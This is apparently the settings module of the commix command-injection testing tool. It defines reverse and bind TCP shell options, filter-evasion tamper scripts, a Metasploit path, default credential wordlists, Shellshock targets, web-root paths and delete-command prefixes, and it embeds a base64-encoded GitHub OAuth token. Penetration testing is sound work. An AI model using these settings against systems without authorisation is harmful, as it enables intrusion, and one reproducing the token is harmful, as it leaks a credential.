VALID_URL_FORMAT = r"https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,310})?"

VALID_URL = True

# Accepted shell menu options
SHELL_OPTIONS = [
        "?",
        "quit",
        "exit",
        "back",
        "os_shell",
        "reverse_tcp",
        "bind_tcp",
        "set",
]

# Accepted reverse tcp shell menu options
SET_OPTIONS = [
        "LHOST",
        "RHOST",
        "LPORT",
        "SRVPORT",
        "URIPATH",
]

# Cookie delimiter
COOKIE_DELIMITER = ";"

# Split parameter value
PARAMETER_SPLITTING_REGEX = ","

# Cookie delimiter
PARAMETER_DELIMITER = "&"

DEFAULT_CODEC = "utf8"

# Reference: http://en.wikipedia.org/wiki/ISO/IEC_8859-1
DEFAULT_PAGE_ENCODING = "iso-8859-1"
try:
  codecs.lookup(DEFAULT_PAGE_ENCODING)
except LookupError:
  DEFAULT_PAGE_ENCODING = DEFAULT_CODEC

# Character Sets List.
# A complete list of the standard encodings Python supports.
ENCODING_LIST = [
  "iso-8859-1",
  "ascii",
  "big5",
  "big5hkscs",
  "cp037",
  "cp424",
  "cp437",
  "cp500",
  "cp720",
  "cp737",
  "cp775",
  "cp850",
  "cp852",
  "cp855",
  "cp856",
  "cp857",
  "cp858",
  "cp860",
  "cp861",
  "cp862",
  "cp863",
  "cp864",
  "cp865",
  "cp866",
  "cp869",
  "cp874",
  "cp875",
  "cp932",
  "cp949",
  "cp950",
  "cp1006",
  "cp1026",
  "cp1140",
  "cp1250",
  "cp1251",
  "cp1252",
  "cp1253",
  "cp1254",
  "cp1255",
  "cp1256",
  "cp1257",
  "cp1258",
  "euc-jp",
  "euc-jis-2004",
  "euc-jisx0213",
  "euc-kr",
  "gb2312",
  "gbk",
  "gb18031",
  "hz",
  "iso2022-jp",
  "iso2022-jp-1",
  "iso2022-jp-2",
  "iso2022-jp-2004",
  "iso2022-jp-3",
  "iso2022-jp-ext",
  "iso2022-kr",
  "latin-1",
  "iso8859-2",
  "iso8859-3",
  "iso8859-4",
  "iso8859-5",
  "iso8859-6",
  "iso8859-7",
  "iso8859-8",
  "iso8859-9",
  "iso8859-10",
  "iso8859-13",
  "iso8859-14",
  "iso8859-15",
  "iso8859-16",
  "johab",
  "koi8-r",
  "koi8-u",
  "mac-cyrillic",
  "mac-greek",
  "mac-iceland",
  "mac-latin2",
  "mac-roman",
  "mac-turkish",
  "ptcp154",
  "shift-jis",
  "shift-jis-2004",
  "shift-jisx0213",
  "utf-32",
  "utf-32-be",
  "utf-32-le",
  "utf-16",
  "utf-16-be",
  "utf-16-le",
  "utf-7",
  "utf-8",
  "utf-8-sig"
 ]

HTTP_ACCEPT_ENCODING_HEADER_VALUE = "gzip, deflate"
HTTP_CONTENT_TYPE_JSON_HEADER_VALUE = "application/json"
HTTP_CONTENT_TYPE_XML_HEADER_VALUE = "text/xml"
DEFAULT_HTTP_CONTENT_TYPE_VALUE = "application/x-www-form-urlencoded"

# Default server banner
SERVER_BANNER = ""

# Server banners list
SERVER_BANNERS = [
    "Microsoft-IIS",
    "Apache",
    r"Nginx/([\w\.]+)",
    r"GWS/([\w\.]+)",
    r"lighttpd/([\w\.]+)",
    r"openresty/([\w\.]+)",
    r"LiteSpeed/([\w\.]+)",
    r"Sun-ONE-Web-Server/([\w\.]+)"
]

# Server banners list
SERVER_OS_BANNERS = [
    r"(Microsoft|Windows|Win[\w\.]+)",
    "Debian",
    "Ubuntu",
    "Fedora",
    "CentOS",
    "FreeBSD",
    "NetBSD",
    "OpenBSD",
    "Slackware",
    "SuSE",
    "Mandrake",
    "Gentoo",
    r"Mac[\-\_\ ]?OSX",
    r"Red[\-\_\ ]?Hat",
    "Unix",
]

# Extensions skipped by crawler
CRAWL_EXCLUDE_EXTENSIONS = [
  "3ds", "3g2", "3gp", "7z", "DS_Store", "a", "aac", "adp", "ai", "aif", "aiff", "apk", "ar",
  "asf", "au", "avi", "bak", "bin", "bk", "bmp", "btif", "bz2", "cab", "caf", "cgm", "cmx", "cpio", "cr2", "dat", "deb",
  "djvu", "dll", "dmg", "dmp", "dng", "doc", "docx", "dot", "dotx", "dra", "dsk", "dts", "dtshd", "dvb", "dwg", "dxf",
  "ear", "ecelp4800", "ecelp7470", "ecelp9600", "egg", "eol", "eot", "epub", "exe", "f4v", "fbs", "fh", "fla", "flac",
  "fli", "flv", "fpx", "fst", "fvt", "g3", "gif", "gz", "h261", "h263", "h264", "ico", "ief", "image", "img", "ipa",
  "iso", "jar", "jpeg", "jpg", "jpgv", "jpm", "jxr", "ktx", "lvp", "lz", "lzma", "lzo", "m3u", "m4a", "m4v", "mar",
  "mdi", "mid", "mj2", "mka", "mkv", "mmr", "mng", "mov", "movie", "mp3", "mp4", "mp4a", "mpeg", "mpg", "mpga", "mxu",
  "nef", "npx", "o", "oga", "ogg", "ogv", "otf", "pbm", "pcx", "pdf", "pea", "pgm", "pic", "png", "pnm", "ppm", "pps",
  "ppt", "pptx", "ps", "psd", "pya", "pyc", "pyo", "pyv", "qt", "rar", "ras", "raw", "rgb", "rip", "rlc", "rz", "s3m",
  "s7z", "scm", "scpt", "sgi", "shar", "sil", "smv", "so", "sub", "swf", "tar", "tbz2", "tga", "tgz", "tif", "tiff",
  "tlz", "ts", "ttf", "uvh", "uvi", "uvm", "uvp", "uvs", "uvu", "viv", "vob", "war", "wav", "wax", "wbmp", "wdp", "weba",
  "webm", "webp", "whl", "wm", "wma", "wmv", "wmx", "woff", "woff2", "wvx", "xbm", "xif", "xls", "xlsx", "xlt", "xm", "xpi",
  "xpm", "xwd", "xz", "z", "zip", "zipx"
]

TARGET_APPLICATION = ""
# Unsupported target application(s) [1]
# [1] https://github.com/commixproject/commix/wiki/Target-applications
UNSUPPORTED_TARGET_APPLICATION = [
    ""
]

REVERSE_TCP = False
BIND_TCP = False

# Injection logs report
SHOW_LOGS_MSG = False

# Enumeration options
ENUMERATION_DONE = False
ENUMERATE_AGAIN = False

# FIle access options
FILE_ACCESS_DONE = False
FILE_ACCESS_AGAIN = False

# XML Data
IS_XML = False

# Regular expression for XML POST data
XML_RECOGNITION_REGEX = r'(?s)\A\s*<[^>]+>(.+>)?\s*\Z'

# JSON Data
IS_JSON = False
IS_VALID_JSON = False

# Infixes used for automatic recognition of parameters carrying anti-CSRF tokens
CSRF_TOKEN_PARAMETER_INFIXES = ("csrf", "xsrf", "token")

# Regular expression used for detecting JSON POST data
JSON_RECOGNITION_REGEX = r'(?s)\A(\s*\[)*\s*\{.*"[^"]+"\s*:\s*("[^"]*"|\d+|true|false|null).*\}\s*(\]\s*)*\Z'

# Regular expression used for detecting JSON-like POST data
JSON_LIKE_RECOGNITION_REGEX = r"(?s)\A(\s*\[)*\s*\{.*'[^']+'\s*:\s*('[^']+'|\d+).*\}\s*(\]\s*)*\Z"

# Base64 format recognition
BASE64_RECOGNITION_REGEX = r'^[A-Za-z0-9+/]+[=]{0,2}$'

# Hex encoded characters recognition
HEX_RECOGNITION_REGEX = r'^(0[xX])?[0-9a-fA-F]+$'

# GET parameters recognition
GET_PARAMETERS_REGEX = r"(.*?)\?(.+)"

DIRECTORY_REGEX = r'(?:/[^/]+)+?/\w+\.\w+'

# TFB Decimal
TFB_DECIMAL = False

# Ignore Error Message
IGNORE_ERR_MSG = False

# Windows PHP installed directory.
WIN_PHP_DIR = "C:\\xampp\\php\\php.exe"
USER_DEFINED_PHP_DIR = False

# Comment out
WIN_COMMENT = "REM"
COMMENT = "#"

#Delete command
WIN_DEL = "powershell.exe Remove-Item "
DEL = "rm "

# Time-based Variables
FOUND_EXEC_TIME = ""
FOUND_DIFF = ""

# Check for PowerShell
PS_ENABLED = None

# ANSI colors removal
ANSI_COLOR_REMOVAL = r'\x1b[^m]*m'

# Default LHOST / LPORT / RHOST setup,
# for the reverse TCP connection
LHOST = ""
LPORT = ""
# for the bind TCP connection
RHOST = ""
# Default settings (web_delivery).
URIPATH = "/"
SRVPORT = 8080

# Session Handler
SESSION_FILE = ""
LOAD_SESSION = None

# Define the default credentials files
USERNAMES_TXT_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "default_usernames.txt"
PASSWORDS_TXT_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "default_passwords.txt"

REQUIRED_AUTHENTICATION = False

INJECTED_HTTP_HEADER = False
INJECTION_CHECKER = False

# List of pages / scripts potentially vulnerable to Shellshock
CGI_SCRIPTS = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "shocker-cgi_list.txt"

# Metasploit Framework Path
METASPLOIT_PATH = "/usr/share/metasploit-framework/"

# Supported HTTP Authentication types
class AUTH_TYPE(object):
  BASIC = "basic"
  DIGEST = "digest"
  BEARER = "bearer"

RAW_HTTP_HEADERS = ""

USER_APPLIED_TAMPER = ""

# Tamper payload modification letters
TAMPER_MODIFICATION_LETTERS = r'([e-zE-Z])'

# Tamper scripts dict
TAMPER_SCRIPTS = {
                  "space2ifs": False,
                  "base64encode": False,
                  "hexencode": False,
                  "space2plus": False,
                  "space2htab": False,
                  "space2vtab": False,
                  "doublequotes": False,
                  "singlequotes": False,
                  "caret": False,
                  "multiplespaces": False,
                  "backslashes": False,
                  "nested": False,
                  "sleep2usleep": False,
                  "sleep2timeout": False,
                  "xforwardedfor": False,
                  "dollaratsigns": False,
                  "printf2echo": False,
                  "uninitializedvariable": False,
                  "slash2env": False,
                  "backticks": False,
                  "randomcase": False,
                  "rev": False
                 }

UNIX_NOT_SUPPORTED_TAMPER_SCRIPTS = [
                  "caret",
                  "space2vtab"
]

WIN_NOT_SUPPORTED_TAMPER_SCRIPTS = [
                  "backslashes"
                  "dollaratsigns",
                  "backticks",
                  "nested",
                  "singlequotes",
                  "slash2env",
                  "sleep2usleep",
                  "printf2echo",
                  "space2ifs",
                  "uninitializedvariable",
                  "randomcase",
                  "rev"
]

EVAL_NOT_SUPPORTED_TAMPER_SCRIPTS = [
                  "backslashes"
                  "caret",
                  "dollaratsigns",
                  "doublequotes",
                  "nested",
                  "singlequotes",
                  "slash2env",
                  "printf2echo",
                  "uninitializedvariable"
]

TIME_RELATED_TAMPER_SCRIPTS = [
                  "sleep2usleep",
                  "sleep2timeout"
]

IGNORE_TAMPER_TRANSFORMATION = [
                  "IFS",
                  "if",
                  "then",
                  "else",
                  "fi",
                  "cmd",
                  "%0d",
                  "PATH%%u*",
                  RANDOM_VAR_GENERATOR,
                  RANDOM_VAR_GENERATOR + "1",
                  RANDOM_VAR_GENERATOR + "2"
]

# HTTP Errors
BAD_REQUEST = "400"
UNAUTHORIZED_ERROR = "401"
FORBIDDEN_ERROR = "403"
NOT_FOUND_ERROR = "404"
NOT_ALLOWED = "405"
NOT_ACCEPTABLE_ERROR = "406"
INTERNAL_SERVER_ERROR = "500"
NOT_IMPLEMENTED = "501"
BAD_GATEWAY = "502"
SERVICE_UNAVAILABLE = "503"
GATEWAY_TIMEOUT = "504"
HTTP_ERROR_CODES = [  BAD_REQUEST,
                      UNAUTHORIZED_ERROR,
                      FORBIDDEN_ERROR,
                      NOT_FOUND_ERROR,
                      NOT_ALLOWED,
                      NOT_ACCEPTABLE_ERROR,
                      INTERNAL_SERVER_ERROR,
                      NOT_IMPLEMENTED,
                      BAD_GATEWAY,
                      SERVICE_UNAVAILABLE,
                      GATEWAY_TIMEOUT
                    ]

HTTP_ERROR_CODES_SUM = []

# End line
class END_LINE:
  CR = "\r"
  LF = "\n"
  CRLF = "\r\n"

# List of end lines
END_LINES_LIST = [attr for attr in dir(END_LINE) if not callable(getattr(END_LINE, attr)) and not attr.startswith("__")]

# Check for updates on start up.
CHECK_FOR_UPDATES_ON_START = True

# Skip the mathematic calculation (Detection Phase)
SKIP_CALC = False

USE_BACKTICKS = False

METASPLOIT_ERROR_MSG =  "You need to have Metasploit installed. "
METASPLOIT_ERROR_MSG += "Please ensure Metasploit is installed in the right path."

# Target URL reload
URL_RELOAD = False

# Command history
CLI_HISTORY = ""

# Check for multi encoded payloads
MULTI_ENCODED_PAYLOAD = []

# Default Timeout (Seconds to wait before timeout connection)
TIMEOUT = 30

# Retries when the connection timeouts (Default: 3).
MAX_RETRIES = 3

# End of file
EOF = False

# Init Test
INIT_TEST = ""

# Check Tor again
TOR_CHECK_AGAIN = True

# URL for checking internet connection.
CHECK_INTERNET_ADDRESS = "http://ipinfo.io"

# Check internet connection.
CHECK_INTERNET = False

UNAUTHORIZED = False

# Multiple OS checks
CHECK_BOTH_OS = False
OS_CHECKS_NUM = 2

# Options to explicitly mask in anonymous (unhandled exception) reports.
SENSITIVE_OPTIONS = ["--data", "-d", "--cookie", "-p", "--url", "-u", "-x", "--auth-cred", "-r", "-l"]

# Github OAuth token used for creating an automatic issue for unhandled exceptions.
GITHUB_REPORT_OAUTH_TOKEN = "YjNiYjdhZDBlYzM2MmM2NGEzYTAzZTc4ZDg1NmYwZTUyZGZlN2EyZQ=="

# Tranform payloads (via tamper script(s))
TRANFROM_PAYLOAD = None

CAPTCHA_DETECED = None

BROWSER_VERIFICATION = None

# Regular expression used for recognition of generic "your ip has been blocked" messages.
BLOCKED_IP_REGEX = r"(?i)(\A|\b)ip\b.*\b(banned|blocked|block list|firewall)"

# Prefix for Google analytics cookie names
GOOGLE_ANALYTICS_COOKIE_PREFIX = "__UTM"

# Default path for tamper scripts
TAMPER_SCRIPTS_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '../',"core/tamper/")) + "/"

# Default path for settings.py file
SETTINGS_PATH = os.path.abspath("src/utils/settings.py")

# Period after last-update to start nagging (about the old revision).
NAGGING_DAYS = 31

TARGET_URL = ""
DOC_ROOT_TARGET_MARK = "%TARGET%"
WINDOWS_DEFAULT_DOC_ROOTS = ["C:\\\\Inetpub\\wwwroot\\", "C:\\\\Inetpub\\wwwroot\\", "C:\\\\xampp\\htdocs\\", "C:\\\\wamp\\www\\"]
LINUX_DEFAULT_DOC_ROOTS = ["/var/www/" + DOC_ROOT_TARGET_MARK + "/public_html/", "/var/www/" + DOC_ROOT_TARGET_MARK + "/", "/usr/local/apache2/htdocs/", "/usr/local/www/data/", "/usr/share/nginx/", "/var/apache2/htdocs/", "/var/www/nginx-default/", "/srv/www/htdocs/"]  # Reference: https://wiki.apache.org/httpd/DistrosDefaultLayout

DEFINED_WEBROOT = RECHECK_FILE_FOR_EXTRACTION = False

# HTTP Headers
COOKIE = "Cookie"
HOST = "Host"
USER_AGENT = "User-Agent"
REFERER = "Referer"
ACCEPT = "Accept"
ACCEPT_CHARSET = "Accept-Charset"
ACCEPT_ENCODING = "Accept-Encoding"
ACCEPT_LANGUAGE = "Accept-Language"
AUTHORIZATION = "Authorization"
CACHE_CONTROL = "Cache-Control"
CONNECTION = "Connection"
CONTENT_ENCODING = "Content-Encoding"
CONTENT_LENGTH = "Content-Length"
CONTENT_RANGE = "Content-Range"
CONTENT_TYPE = "Content-Type"
EXPIRES = "Expires"
IF_MODIFIED_SINCE = "If-Modified-Since"
IF_NONE_MATCH = "If-None-Match"
LAST_MODIFIED = "Last-Modified"
LOCATION = "Location"
PRAGMA = "Pragma"
PROXY_AUTHORIZATION = "Proxy-Authorization"
PROXY_CONNECTION = "Proxy-Connection"
RANGE = "Range"
REFERER = "Referer"
REFRESH = "Refresh"  # Reference: http://stackoverflow.com/a/283794
SERVER = "Server"
SET_COOKIE = "Set-Cookie"
TRANSFER_ENCODING = "Transfer-Encoding"
VIA = "Via"
X_POWERED_BY = "X-Powered-By"
X_DATA_ORIGIN = "X-Data-Origin"
# HTTP Headers values
ACCEPT_VALUE = "*/*"

# HTTP Headers
HTTP_HEADERS = [ USER_AGENT.lower(), REFERER.lower(), HOST.lower() ]
SHELLSHOCK_HTTP_HEADERS =[ COOKIE, USER_AGENT, REFERER ]

# Regular expression used for ignoring some special chars
IGNORE_SPECIAL_CHAR_REGEX = "[^/()A-Za-z0-9.:,_+]"
IGNORE_JSON_CHAR_REGEX = r"[{}\"\[\]]"

FLATTEN_JSON_SEPARATOR = ''.join(random.choice("{}") for _ in range(10)) + "_"

PERFORM_CRACKING = False

PAGE_COMPRESSION = None

# Force usage of given HTTP method (e.g. PUT).
HTTP_METHOD = ""

DECLARED_COOKIES = ""

MULTI_TARGETS = False

# Identified Redirect code
REDIRECT_CODE = ""

# Base64 padding
BASE64_PADDING = "=="

# Crawling phase
CRAWLING = CRAWLING_PHASE = False
CRAWLED_SKIPPED_URLS_NUM = 0
CRAWLED_URLS_NUM = 0
CRAWLED_URLS_INJECTED = []
SKIP_VULNERABLE_HOST = None

# Skipped crawled hrefs
HREF_SKIPPED = []

# Abort on (problematic) HTTP error code (e.g. 401).
ABORT_CODE = []

# Ignore on (problematic) HTTP error code (e.g. 401).
IGNORE_CODE = []

# Default crawling depth
DEFAULT_CRAWLING_DEPTH = 1

SITEMAP_CHECK = None

SITEMAP_XML_FILE = "sitemap.xml"

FOLLOW_REDIRECT = True

# Set predefined answers (e.g. "quit=N,follow=N").
ANSWERS = ""

CHECKING_PARAMETER = ""

# Run host OS command(s) when injection point is found.
ALERT = False

USE_PCRE_E_MODIFIER = None
PCRE_MODIFIER = "/e"


# eof
